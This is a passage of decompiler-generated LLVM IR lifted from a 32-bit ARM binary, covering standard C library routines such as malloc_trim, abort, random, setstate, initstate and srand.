  %v2_17410 = add i32 %v0_17410, 36
  %v3_17410 = inttoptr i32 %v2_17410 to i32*
  %v4_17410 = load i32, i32* %v3_17410, align 4
  store i32 %v4_17410, i32* @r4, align 4
  %v1_17414 = inttoptr i32 %v4_17410 to i32*
  %v2_17414 = load i32, i32* %v1_17414, align 4
  store i32 %v2_17414, i32* %r3.global-to-local, align 4
  %v1_17418 = and i32 %v2_17414, 2
  %v2_17418 = icmp eq i32 %v1_17418, 0
  br i1 %v2_17418, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1740c
  store i32 %v4_17410, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1740c, %bb
  %v1_17420 = xor i1 %v2_17418, true
  call void @__pseudo_cond_branch(i1 %v1_17420, i32 ptrtoint (i32* @global_var_170c4.1414 to i32))
  %v0_17424 = load i32, i32* @r4, align 4
  %v1_17424 = add i32 %v0_17424, 44
  %v2_17424 = inttoptr i32 %v1_17424 to i32*
  %v3_17424 = load i32, i32* %v2_17424, align 4
  store i32 %v3_17424, i32* %r3.global-to-local, align 4
  %v1_17428 = add i32 %v3_17424, 4
  %v2_17428 = inttoptr i32 %v1_17428 to i32*
  %v3_17428 = load i32, i32* %v2_17428, align 4
  store i32 %v3_17428, i32* %r3.global-to-local, align 4
  %v1_1742c = add i32 %v0_17424, 836
  %v2_1742c = inttoptr i32 %v1_1742c to i32*
  %v3_1742c = load i32, i32* %v2_1742c, align 4
  store i32 %v3_1742c, i32* @r2, align 4
  %v1_17430 = and i32 %v3_17428, -4
  store i32 %v1_17430, i32* %r3.global-to-local, align 4
  %v3_17434 = icmp ult i32 %v1_17430, %v3_1742c
  br i1 %v3_17434, label %dec_label_pc_17474, label %dec_label_pc_1743c

dec_label_pc_1743c:                               ; preds = %bb17
  store i32 %v0_17424, i32* %r1.global-to-local, align 4
  %v1_17440 = add i32 %v0_17424, 840
  %v2_17440 = inttoptr i32 %v1_17440 to i32*
  %v3_17440 = load i32, i32* %v2_17440, align 4
  store i32 %v3_17440, i32* %r0.global-to-local, align 4
  %v2_17444 = call i32 @__malloc_trim(i32 %v3_17440, i32 %v0_17424)
  store i32 %v2_17444, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17474

dec_label_pc_1744c:                               ; preds = %dec_label_pc_17310
  %v2_1744c = inttoptr i32 %v1_172e0 to i32*
  %v3_1744c = load i32, i32* %v2_1744c, align 4
  store i32 %v3_1744c, i32* %r0.global-to-local, align 4
  %v1_17450 = add i32 %v4_172d0, 848
  %v2_17450 = inttoptr i32 %v1_17450 to i32*
  %v3_17450 = load i32, i32* %v2_17450, align 4
  store i32 %v3_17450, i32* %r2.global-to-local, align 4
  %v1_17454 = add i32 %v4_172d0, 868
  %v2_17454 = inttoptr i32 %v1_17454 to i32*
  %v3_17454 = load i32, i32* %v2_17454, align 4
  %v2_17458 = add i32 %v3_1744c, %v1_172dc
  store i32 %v2_17458, i32* %r1.global-to-local, align 4
  %v1_1745c = add i32 %v3_17450, -1
  store i32 %v1_1745c, i32* @r2, align 4
  %v2_17460 = sub i32 %v3_17454, %v2_17458
  store i32 %v2_17460, i32* %r3.global-to-local, align 4
  store i32 %v2_17460, i32* %v2_17454, align 4
  %v1_17468 = load i32, i32* @lr, align 4
  %v2_17468 = add i32 %v1_17468, 848
  %v3_17468 = inttoptr i32 %v2_17468 to i32*
  store i32 %v1_1745c, i32* %v3_17468, align 4
  %v0_1746c = load i32, i32* %r0.global-to-local, align 4
  %v1_1746c = load i32, i32* @r5, align 4
  %v2_1746c = sub i32 %v1_1746c, %v0_1746c
  store i32 %v2_1746c, i32* %r0.global-to-local, align 4
  %v4_17470 = call i32 @munmap(i32 %v2_1746c, i32 %v2_17458, i32 %v1_1745c, i32 %v2_17460)
  store i32 %v4_17470, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17474

dec_label_pc_17474:                               ; preds = %bb17, %dec_label_pc_17404, %dec_label_pc_1743c, %dec_label_pc_172f0, %dec_label_pc_1744c
  store i32 %v2_17284, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_17480 = load i32, i32* @r7, align 4
  %v2_17480 = add i32 %v0_17480, 28
  %v3_17480 = inttoptr i32 %v2_17480 to i32*
  %v4_17480 = load i32, i32* %v3_17480, align 4
  store i32 %v4_17480, i32* @ip, align 4
  store i32 95372, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_17480)
  br label %dec_label_pc_1748c

dec_label_pc_1748c:                               ; preds = %entry, %dec_label_pc_17474
  store i32 %v3_17278, i32* @r4, align 4
  store i32 %v6_17278, i32* @r5, align 4
  store i32 %v9_17278, i32* @r6, align 4
  store i32 %v12_17278, i32* @r7, align 4
  store i32 %v18_17278, i32* @lr, align 4
  ret i32 %v2_17284

; uselistorder directives
  uselistorder i32 %v0_17424, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_173e4, { 1, 0 }
  uselistorder i32 %v1_17324, { 1, 0 }
  uselistorder i32 %v0_17324, { 1, 0 }
  uselistorder i32 %v3_172f8, { 1, 0 }
  uselistorder i32 %v1_172dc, { 1, 0, 2 }
  uselistorder i32 %v2_172d8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_172d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17280, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_1748c, { 1, 0 }
  uselistorder label %dec_label_pc_17474, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_17404, { 1, 0 }
  uselistorder label %dec_label_pc_173c4, { 1, 0 }
  uselistorder label %dec_label_pc_173b8, { 1, 0 }
  uselistorder label %dec_label_pc_173b4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_17368, { 1, 0 }
}

define i32 @function_1749c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1749c:
  %v0_1749c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1749c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1749c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1749c, %bb
  %v10_174b0 = phi i32 [ %arg1, %dec_label_pc_1749c ], [ 0, %bb ]
  ret i32 %v10_174b0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_174b4 = load i32, i32* @r4, align 4
  store i32 %v3_174b4, i32* %stack_var_-12, align 4
  %v6_174b4 = load i32, i32* @r5, align 4
  %v4_174c4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 36) to i32*), align 4
  store i32 %v4_174c4, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_174c4, i32* @r0, align 4
  %v0_174d4 = call i32 @__malloc_consolidate()
  %v0_174d8 = load i32, i32* @r4, align 4
  %v0_174dc = load i32, i32* @r5, align 4
  %v2_174e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_174e4, i32* @r4, align 4
  store i32 %v6_174b4, i32* @r5, align 4
  %v2_174e8 = call i32 @__malloc_trim(i32 %v0_174d8, i32 %v0_174dc)
  %v0_174ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_174ec, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_174f0 = phi i32 [ %v2_174e8, %entry ], [ 0, %bb ]
  ret i32 %v4_174f0

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r5, align 4
  %v4_1750c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 20) to i32*), align 4
  store i32 95512, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1750c)
  %v2_17528 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_17534 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_17528, i32 0, i32 32)
  %v0_1753c = load i32, i32* @r5, align 4
  %v2_1753c = add i32 %v0_1753c, 26320
  %v3_1753c = inttoptr i32 %v2_1753c to i32*
  %v4_1753c = load i32, i32* %v3_1753c, align 4
  %v2_17540 = icmp eq i32 %v4_1753c, 0
  br i1 %v2_17540, label %dec_label_pc_17548, label %dec_label_pc_17588

dec_label_pc_17548:                               ; preds = %entry
  store i32 1, i32* %v3_1753c, align 4
  br label %dec_label_pc_17550

dec_label_pc_17550:                               ; preds = %dec_label_pc_17598, %dec_label_pc_17548
  %v0_17554 = load i32, i32* @r5, align 4
  %v2_17554 = add i32 %v0_17554, 936
  store i32 %v2_17554, i32* @r4, align 4
  %v2_17560 = add i32 %v0_17554, 40
  %v3_17560 = inttoptr i32 %v2_17560 to i32*
  %v4_17560 = load i32, i32* %v3_17560, align 4
  call void @__pseudo_branch(i32 %v4_17560)
  %v1_17570 = call i32 @__GI_raise(i32 6)
  %v0_1757c = load i32, i32* @r5, align 4
  %v2_1757c = add i32 %v0_1757c, 20
  %v3_1757c = inttoptr i32 %v2_1757c to i32*
  %v4_1757c = load i32, i32* %v3_1757c, align 4
  store i32 95624, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1757c)
  %v0_1758c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17588

dec_label_pc_17588:                               ; preds = %entry, %dec_label_pc_17550
  %v1_175a0 = phi i32 [ %v0_1753c, %entry ], [ %v0_1758c.pre, %dec_label_pc_17550 ]
  %v2_1758c = add i32 %v1_175a0, 26320
  %v3_1758c = inttoptr i32 %v2_1758c to i32*
  %v4_1758c = load i32, i32* %v3_1758c, align 4
  %v7_17590 = icmp eq i32 %v4_1758c, 1
  br i1 %v7_17590, label %dec_label_pc_17598, label %dec_label_pc_175d4

dec_label_pc_17598:                               ; preds = %dec_label_pc_17588
  %v2_17598 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_17598, i32* @r4, align 4
  store i32 2, i32* %v3_1758c, align 4
  store i32 20, i32* @r2, align 4
  %v2_175b0 = bitcast i32* %stack_var_-28 to i8*
  %v3_175b0 = call i32 @__GI_memset(i8* %v2_175b0, i32 0)
  %v3_175cc = call i32 @__libc_sigaction(i32 6, i32 %v2_17598, i32 0)
  br label %dec_label_pc_17550

dec_label_pc_175d4:                               ; preds = %dec_label_pc_17588
  %v7_175d4 = icmp eq i32 %v4_1758c, 2
  br i1 %v7_175d4, label %dec_label_pc_175dc, label %dec_label_pc_175e8

dec_label_pc_175dc:                               ; preds = %dec_label_pc_175d4
  store i32 3, i32* %v3_1758c, align 4
  %v0_175e4 = call i32 @abort()
  %v0_175e8.pre = load i32, i32* @r5, align 4
  %v1_175e8.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_175e8

dec_label_pc_175e8:                               ; preds = %dec_label_pc_175d4, %dec_label_pc_175dc
  %v3_175f4 = phi i32 [ 26320, %dec_label_pc_175d4 ], [ %v1_175e8.pre, %dec_label_pc_175dc ]
  %v2_175f4 = phi i32 [ %v1_175a0, %dec_label_pc_175d4 ], [ %v0_175e8.pre, %dec_label_pc_175dc ]
  %v2_175e8 = add i32 %v2_175f4, %v3_175f4
  %v3_175e8 = inttoptr i32 %v2_175e8 to i32*
  %v4_175e8 = load i32, i32* %v3_175e8, align 4
  %v7_175ec = icmp eq i32 %v4_175e8, 3
  br i1 %v7_175ec, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_175e8
  store i32 4, i32* %v3_175e8, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_175e8, %bb
  call void @__pseudo_cond_branch(i1 %v7_175ec, i32 ptrtoint (i32* @global_var_14324.1423 to i32))
  br label %dec_label_pc_17600

dec_label_pc_17600:                               ; preds = %dec_label_pc_17600, %.thread2
  %v0_17600 = call i32 @abort()
  br label %dec_label_pc_17600

; uselistorder directives
  uselistorder i32* %v3_1758c, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI_sigprocmask, { 0, 2, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_175e8, { 1, 0 }
  uselistorder label %dec_label_pc_17588, { 1, 0 }
}

define i32 @function_1760c(i64* %arg1) local_unnamed_addr {
dec_label_pc_1760c:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_1760c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1760c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1760c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1760c, %bb
  %v4_17618 = phi i32 [ %tmp, %dec_label_pc_1760c ], [ 0, %bb ]
  ret i32 %v4_17618

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_17624 = call i32 @random()
  ret i32 %v0_17624
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_17634 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  %v4_17664 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17664)
  %v0_17678 = load i32, i32* @r4, align 4
  %v2_17678 = add i32 %v0_17678, 20
  %v3_17678 = inttoptr i32 %v2_17678 to i32*
  %v4_17678 = load i32, i32* %v3_17678, align 4
  store i32 ptrtoint (i32* @global_var_17684.1429 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_17678)
  %v2_17688 = ptrtoint i32* %stack_var_-20 to i32
  %v0_1768c = load i32, i32* @r4, align 4
  %v2_1768c = add i32 %v0_1768c, 1112
  %v2_17690 = inttoptr i32 %v2_1768c to i32*
  %v3_17690 = call i32 @__GI_random_r(i32* %v2_17690, i32 %v2_17688)
  %v0_176a0 = load i32, i32* @r4, align 4
  %v2_176a0 = add i32 %v0_176a0, 28
  %v3_176a0 = inttoptr i32 %v2_176a0 to i32*
  %v4_176a0 = load i32, i32* %v3_176a0, align 4
  call void @__pseudo_branch(i32 %v4_176a0)
  %v3_176ac = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_17634, i32* @r4, align 4
  ret i32 %v3_176ac
}

define i32 @function_176c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_176c0:
  %v0_176c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_176c0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_176c0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_176c0, %bb
  %v10_176d4 = phi i32 [ %arg1, %dec_label_pc_176c0 ], [ 0, %bb ]
  ret i32 %v10_176d4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_17708 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17708)
  %v0_1771c = load i32, i32* @r6, align 4
  %v2_1771c = add i32 %v0_1771c, 20
  %v3_1771c = inttoptr i32 %v2_1771c to i32*
  %v4_1771c = load i32, i32* %v3_1771c, align 4
  call void @__pseudo_branch(i32 %v4_1771c)
  %v0_1772c = load i32, i32* @r6, align 4
  %v2_1772c = add i32 %v0_1772c, 1112
  %v0_17734 = load i32, i32* @r5, align 4
  %v1_17738 = add i32 %v0_1772c, 1120
  %v2_17738 = inttoptr i32 %v1_17738 to i32*
  %v3_17738 = load i32, i32* %v2_17738, align 4
  store i32 %v3_17738, i32* @r4, align 4
  %v2_1773c = inttoptr i32 %v2_1772c to i32*
  %v3_1773c = call i32 @setstate_r(i32 %v0_17734, i32* %v2_1773c)
  %v1_17744 = icmp slt i32 %v3_1773c, 0
  %v3_17754 = load i32, i32* @r4, align 4
  %v4_17754 = add i32 %v3_17754, -4
  %storemerge = select i1 %v1_17744, i32 0, i32 %v4_17754
  %v0_17758 = load i32, i32* @r6, align 4
  %v2_17758 = add i32 %v0_17758, 28
  %v3_17758 = inttoptr i32 %v2_17758 to i32*
  %v4_17758 = load i32, i32* %v3_17758, align 4
  call void @__pseudo_branch(i32 %v4_17758)
  ret i32 %storemerge
}

define i32 @function_17778(i32 %arg1) local_unnamed_addr {
dec_label_pc_17778:
  %v0_17778 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17778, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17778
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17778, %bb
  %v10_1778c = phi i32 [ %arg1, %dec_label_pc_17778 ], [ 0, %bb ]
  ret i32 %v10_1778c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_177c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_177c8)
  %v0_177dc = load i32, i32* @r4, align 4
  %v2_177dc = add i32 %v0_177dc, 20
  %v3_177dc = inttoptr i32 %v2_177dc to i32*
  %v4_177dc = load i32, i32* %v3_177dc, align 4
  call void @__pseudo_branch(i32 %v4_177dc)
  %v0_177ec = load i32, i32* @r6, align 4
  %v0_177f0 = load i32, i32* @r4, align 4
  %v2_177f0 = add i32 %v0_177f0, 1112
  %v0_177f4 = load i32, i32* @r7, align 4
  %v0_177f8 = load i32, i32* @sl, align 4
  store i32 %v0_177f8, i32* @r0, align 4
  %v1_177fc = add i32 %v0_177f0, 1120
  %v2_177fc = inttoptr i32 %v1_177fc to i32*
  %v3_177fc = load i32, i32* %v2_177fc, align 4
  store i32 %v3_177fc, i32* @r5, align 4
  %v4_17800 = inttoptr i32 %v0_177f8 to i32*
  %v5_17800 = call i32 @__GI_initstate_r(i32* %v4_17800, i32 %v0_177ec, i32 %v0_177f4, i32 %v2_177f0)
  %v0_17810 = load i32, i32* @r4, align 4
  %v2_17810 = add i32 %v0_17810, 28
  %v3_17810 = inttoptr i32 %v2_17810 to i32*
  %v4_17810 = load i32, i32* %v3_17810, align 4
  call void @__pseudo_branch(i32 %v4_17810)
  %v0_1781c = load i32, i32* @r5, align 4
  %v1_1781c = add i32 %v0_1781c, -4
  ret i32 %v1_1781c
}

define i32 @function_17838(i32 %arg1) local_unnamed_addr {
dec_label_pc_17838:
  %v0_17838 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17838, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_17838
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17838, %bb
  %v10_1784c = phi i32 [ %arg1, %dec_label_pc_17838 ], [ 0, %bb ]
  ret i32 %v10_1784c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_17850 = load i32, i32* @r4, align 4
  %v6_17850 = load i32, i32* @r5, align 4
  %v9_17850 = load i32, i32* @r6, align 4
  %v15_17850 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r4, align 4
  %v2_17864 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 960), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_17880 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 80) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17880)
  %v0_17894 = load i32, i32* @r4, align 4
  %v2_17894 = add i32 %v0_17894, 20
  %v3_17894 = inttoptr i32 %v2_17894 to i32*
  %v4_17894 = load i32, i32* %v3_17894, align 4
  call void @__pseudo_branch(i32 %v4_17894)
  %v0_178a4 = load i32, i32* @r6, align 4
  store i32 %v0_178a4, i32* @r0, align 4
  %v0_178a8 = load i32, i32* @r4, align 4
  %v2_178a8 = add i32 %v0_178a8, 1112
  %v2_178ac = inttoptr i32 %v0_178a4 to i32*
  %v3_178ac = call i32 @srandom_r(i32* %v2_178ac, i32 %v2_178a8)
  %v0_178c0 = load i32, i32* @r4, align 4
  %v2_178c0 = add i32 %v0_178c0, 28
  %v3_178c0 = inttoptr i32 %v2_178c0 to i32*
  %v4_178c0 = load i32, i32* %v3_178c0, align 4
  call void @__pseudo_branch(i32 %v4_178c0)
  store i32 %v3_17850, i32* @r4, align 4
  store i32 %v6_17850, i32* @r5, align 4
  store i32 %v9_17850, i32* @r6, align 4
  store i32 %v15_17850, i32* @lr, align 4
  ret i32 %v2_17864
}

define i32 @function_178dc(i32 %arg1) local_unnamed_addr {
dec_label_pc_178dc:
  %v0_178dc = load i1, i1* @cpsr_z, align 1
  br i1 %v0_178dc, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_178dc
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_178dc, %bb
  %v10_178f0 = phi i32 [ %arg1, %dec_label_pc_178dc ], [ 0, %bb ]
  ret i32 %v10_178f0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_178f4 = load i32, i32* @r4, align 4
  store i32 %v3_178f4, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_178fc = add i32 %tmp, 12
  %v2_178fc = inttoptr i32 %v1_178fc to i8*
  %v3_178fc = load i8, i8* %v2_178fc, align 1
  %v4_178fc = zext i8 %v3_178fc to i32
  store i32 %v4_178fc, i32* %r1.global-to-local, align 4
  %v2_17900 = icmp eq i8 %v3_178fc, 0
  store i1 %v2_17900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17900, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_1790812 = add i32 %arg1, 4
  store i32 %v1_1790812, i32* %r6.global-to-local, align 4
  %v1_1790c13 = add i32 %tmp, 8
  %v2_1790c14 = inttoptr i32 %v1_1790c13 to i32*
  %v3_1790c15 = load i32, i32* %v2_1790c14, align 4
  store i32 %v3_1790c15, i32* %r0.global-to-local, align 4
  %v3_17928 = add i32 %v3_1790c15, -4
  %v4_17928 = inttoptr i32 %v3_17928 to i32*
  store i32 %v4_178fc, i32* %v4_17928, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_17904 = add i32 %tmp, 4
  %v3_17904 = inttoptr i32 %v2_17904 to i32*
  %v4_17904 = load i32, i32* %v3_17904, align 4
  %v1_17908 = add i32 %arg1, 4
  store i32 %v1_17908, i32* %r6.global-to-local, align 4
  %v1_1790c = add i32 %tmp, 8
  %v2_1790c = inttoptr i32 %v1_1790c to i32*
  %v3_1790c = load i32, i32* %v2_1790c, align 4
  store i32 %v3_1790c, i32* %r0.global-to-local, align 4
  %v3_17914 = sub i32 %v4_17904, %v3_1790c
  %v4_17918 = sdiv i32 %v3_17914, 4
  %v4_1791c = sext i8 %v3_178fc to i32
  store i32 %v4_1791c, i32* %r1.global-to-local, align 4
  %v4_17924 = mul i32 %v4_17918, 5
  %v5_17924 = add i32 %v4_17924, %v4_1791c
  %v3_1792c = add i32 %v3_1790c, -4
  %v4_1792c = inttoptr i32 %v3_1792c to i32*
  store i32 %v5_17924, i32* %v4_1792c, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_17934 = load i32, i32* %r6.global-to-local, align 4
  %v1_17934 = add i32 %v0_17934, -4
  %v2_17934 = inttoptr i32 %v1_17934 to i32*
  %v3_17934 = load i32, i32* %v2_17934, align 4
  %v2_1793c = udiv i32 %v3_17934, 5
  %v3_1793c = urem i32 %v3_17934, 5
  store i32 %v2_1793c, i32* %r0.global-to-local, align 4
  store i32 %v3_1793c, i32* %r1.global-to-local, align 4
  %v2_17944 = icmp ugt i32 %v3_1793c, 3
  %v7_17944 = icmp eq i32 %v3_1793c, 4
  store i1 %v7_17944, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* %r5.global-to-local, align 4
  %v2_1794c = xor i1 %v7_17944, true
  %v3_1794c = and i1 %v2_17944, %v2_1794c
  br i1 %v3_1794c, label %dec_label_pc_179b4, label %dec_label_pc_17950

dec_label_pc_17950:                               ; preds = %bb
  %v4_17958 = mul nuw nsw i32 %v3_1793c, 4
  %v5_17958 = add i32 %v4_17958, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34412)
  %v1_1795c = add i32 %v4_17958, add (i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32 -34392)
  %v2_1795c = inttoptr i32 %v1_1795c to i32*
  %v3_1795c = load i32, i32* %v2_1795c, align 4
  store i32 %v3_1795c, i32* %r5.global-to-local, align 4
  %v6_17960 = inttoptr i32 %v5_17958 to i32*
  %v7_17960 = load i32, i32* %v6_17960, align 4
  store i32 %v7_17960, i32* %r7.global-to-local, align 4
  %v2_17964 = icmp eq i32 %v3_1793c, 0
  store i1 %v2_17964, i1* %cpsr_z.global-to-local, align 1
  %v1_17968 = trunc i32 %v3_1795c to i8
  %v2_17968 = load i32, i32* %r4.global-to-local, align 4
  %v3_17968 = add i32 %v2_17968, 13
  %v4_17968 = inttoptr i32 %v3_17968 to i8*
  store i8 %v1_17968, i8* %v4_17968, align 1
  %v0_1796c = load i32, i32* %r7.global-to-local, align 4
  %v1_1796c = trunc i32 %v0_1796c to i8
  %v2_1796c = load i32, i32* %r4.global-to-local, align 4
  %v3_1796c = add i32 %v2_1796c, 14
  %v4_1796c = inttoptr i32 %v3_1796c to i8*
  store i8 %v1_1796c, i8* %v4_1796c, align 1
  %v0_17970 = load i32, i32* %r1.global-to-local, align 4
  %v1_17970 = trunc i32 %v0_17970 to i8
  %v2_17970 = load i32, i32* %r4.global-to-local, align 4
  %v3_17970 = add i32 %v2_17970, 12
  %v4_17970 = inttoptr i32 %v3_17970 to i8*
  store i8 %v1_17970, i8* %v4_17970, align 1
  %v0_17974 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17974, label %dec_label_pc_179a0, label %dec_label_pc_17978

dec_label_pc_17978:                               ; preds = %dec_label_pc_17950
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_1797c = load i32, i32* %r6.global-to-local, align 4
  %v1_1797c = add i32 %v0_1797c, -4
  %v2_1797c = inttoptr i32 %v1_1797c to i32*
  %v3_1797c = load i32, i32* %v2_1797c, align 4
  %v2_17980 = sdiv i32 %v3_1797c, 5
  store i32 %v2_17980, i32* %r0.global-to-local, align 4
  %v4_17984 = mul i32 %v2_17980, 4
  %v5_17984 = add i32 %v4_17984, %v0_1797c
  %v1_17988 = load i32, i32* %r4.global-to-local, align 4
  %v2_17988 = add i32 %v1_17988, 4
  %v3_17988 = inttoptr i32 %v2_17988 to i32*
  store i32 %v5_17984, i32* %v3_17988, align 4
  %v0_1798c = load i32, i32* %r7.global-to-local, align 4
  %v1_1798c = load i32, i32* %r0.global-to-local, align 4
  %v2_1798c = add i32 %v1_1798c, %v0_1798c
  %v0_17990 = load i32, i32* %r5.global-to-local, align 4
  %v2_17994 = udiv i32 %v2_1798c, %v0_17990
  %v3_17994 = urem i32 %v2_1798c, %v0_17990
  store i32 %v2_17994, i32* %r0.global-to-local, align 4
  %v0_17998 = load i32, i32* %r6.global-to-local, align 4
  %v4_17998 = mul i32 %v3_17994, 4
  %v5_17998 = add i32 %v0_17998, %v4_17998
  store i32 %v5_17998, i32* %r1.global-to-local, align 4
  %v1_1799c = load i32, i32* %r4.global-to-local, align 4
